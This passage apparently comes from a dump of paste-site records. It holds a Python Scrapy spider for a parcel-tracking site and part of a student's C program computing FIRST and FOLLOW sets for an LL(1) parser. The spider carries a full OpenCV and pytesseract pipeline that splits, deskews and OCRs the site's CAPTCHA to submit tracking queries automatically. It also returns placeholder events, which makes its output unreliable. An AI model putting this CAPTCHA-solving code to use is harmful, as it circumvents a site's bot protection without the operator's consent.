\xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image[next_pos[1], next_pos[0]] != WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 return visited_points \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 images = []\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 for y in range(height):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image[y, x] != WHITE_COLOR and (x, y) not in total_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points = bfs((x, y))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 total_visited_points.update(visited_points)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 images.append(point_to_image(visited_points))\n\xa0\n\xa0 \xa0 try:\n\xa0 \xa0 \xa0 \xa0 assert(len(images) == 4)\n\xa0 \xa0 except Exception:\n\xa0 \xa0 \xa0 \xa0 print(""sticky image"")\n\xa0\n\xa0 \xa0 return images\n\xa0 \xa0 \ndef make_inner_border(image):\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 image = cv2.line(image, (0, 0), (0, height), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (0, 0), (width, 0), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (width, 0), (width, height), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (0, height), (width, height), (255, 255, 255), 2)\n\xa0 \xa0 return image\n\xa0 \xa0 \ndef coordinate_character(image):\n\xa0 \xa0 BOTTOM_DISTANCE = 8\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 \n\xa0 \xa0 y = height - 1\n\xa0 \xa0 \n\xa0 \xa0 while y >= 0:\n\xa0 \xa0 \xa0 \xa0 is_bottom_y = False\n\xa0 \xa0 \xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image[y][x] != 255:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 is_bottom_y = True\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if is_bottom_y:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break\n\xa0 \xa0 \xa0 \xa0 y -= 1\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 move_matrix = np.float32([[1, 0, 0], [0, 1, height - BOTTOM_DISTANCE - y]])\n\xa0 \xa0 dimensions = (width, height)\n\xa0 \xa0 return cv2.warpAffine(image, move_matrix, dimensions, borderValue=255)\n\xa0\ndef deskew_image(image):\n\xa0 \xa0 # 3.1. make a white inner border to remove sticky parts when spliting images -> get correct contour\n\xa0 \xa0 image = make_inner_border(image)\n\xa0 \xa0 \n\xa0 \xa0 # 3.2. get the contour for character\n\xa0 \xa0 contours, hierarchy = cv2.findContours(image, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n\xa0 \xa0 if len(contours) > 1:\n\xa0 \xa0 \xa0 \xa0 contour = contours[1]\n\xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 contour = contours[0]\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # 3.3. get the minimum area rectangle of contour\n\xa0 \xa0 rect = cv2.minAreaRect(contour)\n\xa0 \xa0 fbox = cv2.boxPoints(rect)\n\xa0 \xa0 box = np.int0(fbox)\n\xa0 \xa0 # image = cv2.drawContours(image,[box], 0, (100,100,100), 1)\n\xa0 \xa0 \n\xa0 \xa0 # 3.4. get the center line\n\xa0 \xa0 rows, cols = image.shape[:2]\n\xa0 \xa0 vx, vy, x, y = cv2.fitLine(contour, cv2.DIST_L2, 0, 0.01, 0.01)\n\xa0 \xa0 lefty = int((-x * vy / vx) + y)\n\xa0 \xa0 righty = int(((cols - x) * vy / vx) + y)\n\xa0 \xa0 \n\xa0 \xa0 left_point = (0, lefty)\n\xa0 \xa0 right_point = (cols - 1, righty)\n\xa0 \xa0 # image = cv2.line(image, right_point, left_point, (0,255,0), 1)\n\xa0 \xa0 \n\xa0 \xa0 is_left_inclined_line = (lefty < righty)\n\xa0 \xa0 \n\xa0 \xa0 # M = cv2.moments(contour)\n\xa0 \xa0 # cX = int(M[""m10""] / M[""m00""])\n\xa0 \xa0 # cY = int(M[""m01""] / M[""m00""])\n\xa0\n\xa0 \xa0 # 3.5. get 2 top points & calculate the angle\n\xa0 \xa0 fbox = sorted(fbox, key=lambda point: point[1])\n\xa0 \xa0 top_point_1 = fbox[0]\n\xa0 \xa0 top_point_2 = fbox[1]\n\xa0 \xa0 \n\xa0 \xa0 is_left_angle = (top_point_1[0] > top_point_2[0])\n\xa0 \xa0 \n\xa0 \xa0 # 3.5.1. using tan function in Trigonometry\n\xa0 \xa0 height = abs(top_point_1[1] - top_point_2[1])\n\xa0 \xa0 base = abs(top_point_1[0] - top_point_2[0])\n\xa0 \xa0 angle = math.degrees(math.atan(height/base))\n\xa0 \xa0 \n\xa0 \xa0 if is_left_angle:\n\xa0 \xa0 \xa0 \xa0 angle = -angle\n\xa0 \xa0 \n\xa0 \xa0 # print(abs(abs(angle) - 45), is_left_angle, is_left_inclined_line)\n\xa0 \xa0 # using center line to check 2 top points when the angle nearly 45 degree\n\xa0 \xa0 if abs(abs(angle) - 45) <= 5 and is_left_inclined_line != is_left_angle:\n\xa0 \xa0 \xa0 \xa0 top_point_2 = fbox[2]\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 is_left_angle = (top_point_1[0] > top_point_2[0])\n\xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 height = abs(top_point_1[1] - top_point_2[1])\n\xa0 \xa0 \xa0 \xa0 base = abs(top_point_1[0] - top_point_2[0])\n\xa0 \xa0 \xa0 \xa0 angle = math.degrees(math.atan(height/base))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if is_left_angle:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 angle = -angle\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # print(angle)\n\xa0\n\xa0 \xa0 # 3.6. deskew the image\n\xa0 \xa0 (h, w) = image.shape[:2]\n\xa0 \xa0 center = (w // 2, h // 2)\n\xa0 \xa0 M = cv2.getRotationMatrix2D(center, angle, 1.0)\n\xa0 \xa0 image = cv2.warpAffine(image, M, (w, h), flags=cv2.INTER_CUBIC, borderMode=cv2.BORDER_REPLICATE)\n\xa0 \xa0 \n\xa0 \xa0 return image\n\xa0\ndef preprocess_image(image): \n\xa0 \xa0 image.save(""output_image_retscn_origin.png"")\n\xa0 \xa0 # 1. denoise image\n\xa0 \xa0 image = denoise_image(image)\n\xa0 \xa0 \n\xa0 \xa0 # convert PIL image to cv2 image\n\xa0 \xa0 np_image = np.array(image)\n\xa0 \xa0 image = cv2.cvtColor(np_image, cv2.COLOR_RGB2BGR)\n\xa0 \xa0 image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n\xa0 \xa0 \n\xa0 \xa0 # 2. split image to 4 character images\n\xa0 \xa0 # image_1, image_2, image_3, image_4 = split_image(image) \xa0\n\xa0 \xa0 images = split_image(image)\n\xa0 \xa0 \n\xa0 \xa0 # 3. deskew images\n\xa0 \xa0 for i in range(len(images)):\n\xa0 \xa0 \xa0 \xa0 images[i] = deskew_image(images[i])\n\xa0 \xa0 # image_1 = deskew_image(image_1)\n\xa0 \xa0 # image_2 = deskew_image(image_2)\n\xa0 \xa0 # image_3 = deskew_image(image_3)\n\xa0 \xa0 # image_4 = deskew_image(image_4)\n\xa0 \xa0 \n\xa0 \xa0 # 4. coordinate the characters \n\xa0 \xa0 for i in range(len(images)):\n\xa0 \xa0 \xa0 \xa0 coordinate_character(images[i])\n\xa0 \xa0 # image_1 = coordinate_character(image_1)\n\xa0 \xa0 # image_2 = coordinate_character(image_2)\n\xa0 \xa0 # image_3 = coordinate_character(image_3)\n\xa0 \xa0 # image_4 = coordinate_character(image_4)\n\xa0 \xa0 \n\xa0\n\xa0 \xa0 # 5. merge the images\n\xa0 \xa0 # image = np.concatenate((image_1, image_2, image_3, image_4), axis=1)\n\xa0 \xa0 image = np.concatenate(images, axis=1)\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 image = cv2.resize(image, (width * 4, height * 5), interpolation=cv2.INTER_AREA)\n\xa0 \xa0 cv2.imwrite(""output_image_rest_cn_2.png"", image)\n\xa0\n\xa0 \xa0 # convert cv2 image to PIL image\n\xa0 \xa0 image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n\xa0 \xa0 image = Image.fromarray(image)\n\xa0 \xa0 return image\n\xa0\nclass RETSCNScraper(BaseScraperItemPipeline, CookieMixin):\n\xa0 \xa0 name = ""RETSCNScraper""\n\xa0\n\xa0 \xa0 def __init__(self, name=None, **kwargs):\n\xa0 \xa0 \xa0 \xa0 super(RETSCNScraper, self).__init__(name, **kwargs)\n\xa0 \xa0 \xa0 \xa0 self.start_urls = [RETSCN_BASE_URL]\n\xa0 \xa0 \xa0 \xa0 self.max_retry = 0\n\xa0 \xa0 \xa0 \xa0 self.retry_count = 0\n\xa0\n\xa0 \xa0 def parse(self, response):\n\xa0 \xa0 \xa0 \xa0 self.update_local_cookie(response)\n\xa0 \xa0 \xa0 \xa0 try:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image = Image.open(io.BytesIO(response.body))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # captcha_txt = post_process_captcha(pytesseract.image_to_string(image, config=\'--psm 13\'))\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 captcha_txt = post_process_captcha(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pytesseract.image_to_string(preprocess_image(image))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 except Exception:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 activity_logger.info(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""{} {} cannot get captcha image"".format(self.name, self.parcel_id)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0\n\xa0 \xa0 \xa0 \xa0 print(""captcha result:"", captcha_txt)\n\xa0 \xa0 \xa0 \xa0 # Captcha always has 4 characters\n\xa0 \xa0 \xa0 \xa0 if captcha_txt and len(captcha_txt) == 4:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 formdata = {""danhao"": self.parcel_id, ""yanzhengma"": captcha_txt}\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # After solving captcha and post to the endpoint it will return the actual track url\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.produce_request(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 FormRequest,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 RETSCN_TRACK_URL,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 formdata=formdata,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 cookies=self.cookies,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 method=""POST"",\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 callback=self.extract_data,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 errback=self.error_call_back,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 elif self.retry_count < self.max_retry:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 def extract_data(self, response):\n\xa0 \xa0 \xa0 \xa0 event_list = response.css("".text"")\n\xa0\n\xa0 \xa0 \xa0 \xa0 events = []\n\xa0 \xa0 \xa0 \xa0 if event_list:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 events = [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""event_type"": ""asdsad"",\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""event_time"": ""2022-03-12T12:30:00""\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0\n\xa0 \xa0 \xa0 \xa0 return self.save_result(events)', date='2022-06-01 08:36:58 +00:00', hash_val='01564311bbe1484a1f9dc5da1794d29d', url='/pUcaN6zw', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='maycod23', title='LL_1_Parser', content='// #include<iostream>\n// using namespace std;\n#include<stdio.h>\n#include<string.h>\n#define TSIZE 128\nint table[100][TSIZE];\nchar terminal[TSIZE];\nchar nonterminal[26];\nstruct product {\n\xa0 \xa0 char str[100];\n\xa0 \xa0 int len;\n} pro[20];\nint no_pro;\nchar first[26][TSIZE];\nchar follow[26][TSIZE];\nchar first_rhs[100][TSIZE];\nint isNT(char c) {return c >= \'A\' && c <= \'Z\';}\nvoid readFromFile()\n{ \xa0 FILE* fptr;\n\xa0 \xa0 fptr = fopen(""code.txt"", ""r"");\n\xa0 \xa0 char buffer[255];\n\xa0 \xa0 int i, j;\n\xa0 \xa0 while (fgets(buffer, sizeof(buffer), fptr)) {\n\xa0 \xa0 \xa0 \xa0 printf(""%s"", buffer);\n\xa0 \xa0 \xa0 \xa0 j = 0;\n\xa0 \xa0 \xa0 \xa0 nonterminal[buffer[0] - \'A\'] = 1;\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < strlen(buffer) - 1; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (buffer[i] == \'|\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++no_pro;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro - 1].str[j] = \'\\0\';\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro - 1].len = j;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[0] = pro[no_pro - 1].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[1] = pro[no_pro - 1].str[1];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[2] = pro[no_pro - 1].str[2];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 j = 3;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[j] = buffer[i];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++j;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!isNT(buffer[i]) && buffer[i] != \'-\' && buffer[i] != \'>\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 terminal[buffer[i]] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 pro[no_pro].len = j;\n\xa0 \xa0 \xa0 \xa0 ++no_pro;\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FOLLOW_B(char A, char B)\n{ \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[B - \'A\'][i] = follow[B - \'A\'][i] || first[A - \'A\'][i];\n\xa0 \xa0 }\n}\nvoid add_FOLLOW_A_to_FOLLOW_B(char A, char B)\n{ \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[B - \'A\'][i] = follow[B - \'A\'][i] || follow[A - \'A\'][i];\n\xa0 \xa0 }\n}\nvoid FOLLOW()\n{ \xa0 int t = 0;\n\xa0 \xa0 int i, j, k, x;\n\xa0 \xa0 while (t++ < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (k = 0; k < 26; ++k) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!nonterminal[k]) continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char nt = k + \'A\';\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (nt == pro[i].str[j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (x = j + 1; x < pro[i].len; ++x) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[x];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FOLLOW_B(sc, nt);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[nt - \'A\'][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (x == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FOLLOW_A_to_FOLLOW_B(pro[i].str[0], nt);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FIRST_B(char A, char B) {\n\xa0 \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[B - \'A\'][i] = first[A - \'A\'][i] || first[B - \'A\'][i];\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}\nvoid FIRST() {\n\xa0 \xa0 int i, j;\n\xa0 \xa0 int t = 0;\n\xa0 \xa0 while (t < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[j];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FIRST_B(sc, pro[i].str[0]);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[pro[i].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (j == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[pro[i].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'] = 1;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 ++t;\n\xa0\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FIRST_RHS__B(char A, int B) {\n\xa0 \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[B][i] = first[A\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][i] || first_rhs[B][i];\n\xa0\n\xa0 \xa0 }\n}\nvoid FIRST_RHS() {\n\xa0 \xa0 int i, j;\n\xa0 \xa0 int t = 0;\n\xa0 \xa0 while (t < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[j];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FIRST_RHS__B(sc, i);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[i][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (j == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[i][\'^\'] = 1;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 ++t;\n\xa0\n\xa0 \xa0 }\n}\nint main() {\n\xa0 \xa0 printf(""UE193117 UDESH BIND PRODUCTIONS:"");\n\xa0 \xa0 readFromFile();\n\xa0 \xa0 follow[pro[0].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0- \'A\'][\'$\'] = 1;\n\xa0 \xa0 FIRST();\n\xa0 \xa0 FOLLOW();\n\xa0 \xa0 FIRST_RHS();\n\xa0 \xa0 int i, j, k;\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char c = pro[i].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""FIRST OF %c: "", c);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[c - \'A\'][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char c = pro[i].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""FOLLOW OF %c: "", c);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (follow[c - \'A\'][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 